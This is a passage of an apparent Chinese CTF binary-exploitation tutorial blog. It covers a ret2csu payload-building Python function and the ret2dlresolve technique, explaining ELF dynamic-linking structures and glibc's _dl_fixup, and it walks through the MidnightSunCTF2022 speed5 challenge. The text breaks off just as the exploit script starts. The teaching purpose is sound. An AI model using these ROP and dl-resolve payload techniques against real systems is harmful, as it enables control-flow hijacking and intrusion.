寄存器的值就可以利用 <code>0x0000000000400609</code> 地址处的
<code>call</code> 指令执行任意函数。因此可以利用
<code>0x0000000000400616</code> 到 <code>0000000000400624</code>
的汇编指令先控制寄存器的值，然后再执行 <code>0x0000000000400600</code>
到 <code>0x0000000000400624</code>
的汇编指令调用目标函数，然后返回到主函数再次利用。</p>
<p>对应脚本如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">csu_front_addr = <span class="number">0x0000000000400600</span></span><br><span class="line">csu_end_addr = <span class="number">0x000000000040061A</span></span><br><span class="line">fakeebp = <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x80</span> + fakeebp</span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>
<p>其实，除了上述这个 gadgets，gcc 默认还会编译进去一些其它的函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_init</span><br><span class="line">_start</span><br><span class="line">call_gmon_start</span><br><span class="line">deregister_tm_clones</span><br><span class="line">register_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">frame_dummy</span><br><span class="line">__libc_csu_init</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_fini</span><br></pre></td></tr></table></figure></div>
<p>我们也可以尝试利用其中的一些代码来进行执行。此外，由于 PC
本身只是将程序的执行地址处的数据传递给 CPU，而 CPU
则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。</p>
<h1 id="ret2dlresolve">ret2dlresolve</h1>
<p>需要用 ret2dlresolve 的题目的最大特征是不提供 libc 。另外如果使用
ret2dlresolve 则不能使用 patchelf 修改 elf
文件，因为这样会移动延迟绑定相关的结构。</p>
<h2 id="相关结构">相关结构</h2>
<p>主要有 <code>.dynamic</code> 、<code>.dynstr</code>
、<code>.dynsym</code> 和 <code>.rel.plt</code> 四个重要的 section
。</p>
<p>结构及关系如下如图（以 32 位为例）： <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d05fcb3f3322bf190a51a7088d9b1ad1.png"
                     
                      
                
                ></p>
<h3 id="dyn">Dyn</h3>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;			<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure></div>
<p>Dyn 结构体用于描述动态链接时需要使用到的信息，其成员含义如下：</p>
<ul>
<li><code>d_tag</code>
表示标记值，指明了该结构体的具体类型。比如，<code>DT_NEEDED</code>
表示需要链接的库名，<code>DT_PLTRELSZ</code> 表示 PLT
重定位表的大小等。</li>
<li><code>d_un</code>
是一个联合体，用于存储不同类型的信息。具体含义取决于 <code>d_tag</code>
的值。
<ul>
<li>如果 <code>d_tag</code> 的值是一个整数类型，则用 <code>d_val</code>
存储它的值。</li>
<li>如果 <code>d_tag</code> 的值是一个指针类型，则用 <code>d_ptr</code>
存储它的值。</li>
</ul></li>
</ul>
<h3 id="sym">Sym</h3>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Symbol table entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure></div>
<p>Sym 结构体用于描述 ELF
文件中的符号（Symbol）信息，其成员含义如下：</p>
<ul>
<li><code>st_name</code>：指向一个存储符号名称的字符串表的索引，即<strong>字符串相对于字符串表起始地址的偏移</strong>。</li>
<li><code>st_info</code>：如果 <strong><code>st_other</code> 为
0</strong> 则设置成 0x12 即可。</li>
<li><code>st_other</code>：决定<strong>函数参数</strong>
<code>link_map</code> 参数是否有效。如果该值不为 0 则直接通过
<code>link_map</code> 中的信息计算出目标函数地址。否则需要调用
<code>_dl_lookup_symbol_x</code> 函数查询出新的 <code>link_map</code> 和
<code>sym</code> 来计算目标函数地址。</li>
<li><code>st_value</code>：符号地址相对于模块基址的偏移值。</li>
</ul>
<h3 id="rel">Rel</h3>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Relocation table entry without addend (in section of type SHT_REL).  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* I have seen two different definitions of the Elf64_Rel and</span></span><br><span class="line"><span class="comment">   Elf64_Rela structures, so we&#x27;ll leave them out until Novell (or</span></span><br><span class="line"><span class="comment">   whoever) gets their act together.  */</span></span><br><span class="line"><span class="comment">/* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf64_Rel;</span><br></pre></td></tr></table></figure></div>
<p>Rel 结构体用于描述重定位（Relocation）信息，其成员含义如下：</p>
<ul>
<li><code>r_offset</code>：加上<strong>传入的参数</strong>
<code>link_map-&gt;l_addr</code> 等于该函数对应 got 表地址。</li>
<li><code>r_info</code> ：符号索引的低 8 位（32 位 ELF）或低 32 位（64
位 ELF）指示符号的类型这里设为 7 即可，高 24 位（32 位 ELF）或高 32
位（64 位 ELF）指示符号的索引即 <code>Sym</code>
构造的数组中的索引。</li>
</ul>
<h3 id="link_map">link_map</h3>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    ElfW(Addr) l_addr;		<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">				   file and the addresses in memory.  */</span></span><br><span class="line">    ...</span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p><code>link_map</code>
是存储目标函数查询结果的一个结构体，我们主要关心 <code>l_addr</code> 和
<code>l_info</code> 两个成员即可。</p>
<ul>
<li><code>l_addr</code>：目标函数所在 lib 的基址。</li>
<li><code>l_info</code>：<code>Dyn</code> 结构体指针，指向各种结构对应的
<code>Dyn</code> 。
<ul>
<li><code>l_info[DT_STRTAB]</code>：即 <code>l_info</code> 数组第 5
项，指向 <code>.dynstr</code> 对应的 <code>Dyn</code> 。</li>
<li><code>l_info[DT_SYMTAB]</code>：即 <code>l_info</code> 数组第 6
项，指向 <code>Sym</code> 对应的 <code>Dyn</code> 。</li>
<li><code>l_info[DT_JMPREL]</code>：即 <code>l_info</code> 数组第 23
项，指向 <code>Rel</code> 对应的 <code>Dyn</code> 。</li>
</ul></li>
</ul>
<h2 id="dl_runtime_resolve-函数">_dl_runtime_resolve 函数</h2>
<p><code>_dl_runtime_resolve</code> 函数的作用可以见前面 ret2libc 中
linux 延迟绑定机制的原理介绍图。这里详细介绍的是该函数的具体实现。</p>
<p>其中 <code>_dl_runtime_resolve</code> 的核心函数位
<code>_dl_fixup</code> 函数，这里是为了避免 <code>_dl_fixup</code>
传参与目标函数传参干扰（<code>_dl_runtime_resolve</code>
函数通过栈传参然后转换成 <code>_dl_fixup</code>
的寄存器传参）以及调用目标函数才在 <code>_dl_fixup</code> 外面封装一个
<code>_dl_runtime_resolve</code> 函数。<code>_dl_fixup</code>
函数的定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(truct link_map *l, ElfW(Word) reloc_arg) &#123;</span><br><span class="line">    <span class="comment">// 获取符号表地址</span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">    <span class="comment">// 获取字符串表地址</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line">    <span class="comment">// 获取函数对应的重定位表结构地址，sizeof (PLTREL) 即 Elf*_Rel 的大小。</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> reloc_offset reloc_arg * sizeof (PLTREL)</span></span><br><span class="line">    <span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">// 获取函数对应的符号表结构地址</span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">// 得到函数对应的got地址，即真实函数地址要填回的地址</span></span><br><span class="line">    <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *) (l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">    <span class="type">lookup_t</span> result;</span><br><span class="line">    DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断重定位表的类型，必须要为 ELF_MACHINE_JMP_SLOT(7)</span></span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">       used don&#x27;t look in the global scope.  */</span></span><br><span class="line">    <span class="comment">// ☆ 关键判断，决定目标函数地址的查找方法。☆</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">            version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">            <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">                version = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment">       not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">       we are not using any threads (yet).  */</span></span><br><span class="line">        <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P) &#123;</span><br><span class="line">            THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">            flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">        RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="comment">// 查找目标函数地址</span></span><br><span class="line">        <span class="comment">// result 为 libc 的 link_map ，其中有 libc 的基地址。</span></span><br><span class="line">        <span class="comment">// sym 指针指向 libc 中目标函数对应的符号表，其中有目标函数在 libc 中的偏移。</span></span><br><span class="line">        result = _dl_lookup_symbol_x(strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">                                     version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">            THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">        RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">       of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment">       offset.  */</span></span><br><span class="line">        <span class="comment">// 基址 + 偏移算出目标函数地址 value</span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">       address) is also known.  */</span></span><br><span class="line">        <span class="comment">// 这里认为 link_map 和 sym 中已经是目标函数的信息了，因此直接计算目标函数地址。</span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">        result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">    value = elf_machine_plt_value(l, reloc, value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">        &amp;&amp; __builtin_expect(ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">        value = elf_ifunc_invoke(DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    <span class="comment">// 更新 got 表</span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt(l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>需要注意的是 <code>_dl_fixup</code>
中会有如下判断，根据这个判断决定了重定位的策略。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>
<p><code>_dl_fixup</code> 函数在计算出目标函数地址并更新 got
表之后会回到 <code>_dl_runtime_resolve</code> 函数，之后
<code>_dl_runtime_resolve</code>
函数会<strong>调用目标函数</strong>。</p>
<h2 id="位-ret2dlresolve">32 位 ret2dlresolve</h2>
<p>在 32 位下我们可以利用
<code>ELFW(ST_VISIBILITY) (sym-&gt;st_other)</code> 为 0
时的执行流程进行控制流劫持，因为这个执行流程会自动计算目标函数的地址，<strong>不需要知道
libc 具体版本</strong>，适用性更强。</p>
<p>其中 <code>ELFW(ST_VISIBILITY) (sym-&gt;st_other)</code> 为 0 时
<code>_dl_runtime_resolve</code> 函数的具体执行流程为： <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i-blog.csdnimg.cn/blog_migrate/52d2f9340bd5f998d2887f40be788f3e.png%20=70%x"
                     
                      
                
                ></p>
<ul>
<li>用 <code>link_map</code> 访问 <code>.dynamic</code> ，取出
<code>.dynstr</code> ， <code>.dynsym</code> ， <code>.rel.plt</code>
的指针。</li>
<li><code>.rel.plt + 第二个参数</code> 求出当前函数的重定位表项
<code>Elf32_Rel</code> 的指针，记作 <code>rel</code> 。</li>
<li><code>rel-&gt;r_info &gt;&gt; 8</code> 作为 <code>.dynsym</code>
的下标，求出当前函数的符号表项 <code>Elf32_Sym</code> 的指针，记作
<code>sym</code> 。</li>
<li><code>.dynstr + sym-&gt;st_name</code> 得出符号名字符串指针。</li>
<li>在动态链接库查找这个函数的地址，并且把地址赋值给
<code>*rel-&gt;r_offset</code> ，即 GOT 表。</li>
<li>调用这个函数。</li>
</ul>
<h3 id="改写-.dynamic-的-dt_strtab">改写 .dynamic 的 DT_STRTAB</h3>
<p>这个只有在 checksec 时 <code>NO RELRO</code> 可行，即
<code>.dynamic</code> 可写。因为 <code>ret2dl-resolve</code> 会从
<code>.dynamic</code> 里面拿 <code>.dynstr</code>
字符串表的指针，然后加上 offset
取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够改写这个指针到一块我们能够操纵的内存空间，当
resolve 的时候，就能 resolve 成我们所指定的任意库函数。</p>
<h3
id="操纵第二个参数使其指向我们所构造的-elf32_rel">操纵第二个参数，使其指向我们所构造的
Elf32_Rel</h3>
<p>由于 <code>_dl_runtime_resolve</code>
函数各种按下标取值的操作都没有进行越界检查，因此如果
<code>.dynamic</code> 不可写就操纵 <code>_dl_runtime_resolve</code>
函数的第二个参数，使其访问到可控的内存，然后在该内存中伪造
<code>.rel.plt</code> ，进一步可以伪造 <code>.dynsym</code> 和
<code>.dynstr</code> ，最终调用目标函数。</p>
<p>这里以 MidnightSunCTF2022 的 <a class="link" 
 target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/2022MidnightSunCTF_speed5" >speed5<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i>
为例讲解具体利用过程：</p>
<p>可以看出，程序主体部分是一个非常简单的栈溢出。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">go</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">48u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>由于溢出长度有限，因此首先需要栈迁移到其他地址处。 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i-blog.csdnimg.cn/blog_migrate/d9b4d1426691a6b5f2d36eab1f459760.png%20=60%x"
                     
                      
                
                ></p>
<p>为了调用 <code>_dl_runtime_resolve</code> 函数，可以把接下来 rop
中的返回地址设为该函数的 plt 表地址。该地址对应的汇编指令如下： <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/e67b342e7833f0cba6904e7f65910901.png"
                     
                      
                
                > 可以看出
<code>_dl_runtime_resolve(link_map_obj, reloc_offset)</code> 的参数1
<code>link_map_obj</code> 被 push 到栈中，在此之前，栈顶一定是参数2
<code>reloc_arg</code> 。因此构造的 rop
中接下来的值是伪造的参数2。接下来rop链的内容是目标函数的返回地址和参数（具体rop链为什么这么构造可以看前面
ret2libc 中 linux 延迟绑定机制的原理介绍图）。</p>
<p>之后就是伪造那 3 个结构，具体见下图。 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/6dafe13803caaf398e55613189c6bda3.png"
                     
                      
                
                > <strong>注意：如果
patchelf 修改了 ELF 文件，那么这些表的偏移会发生改变。</strong></p>
<p>exp 如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 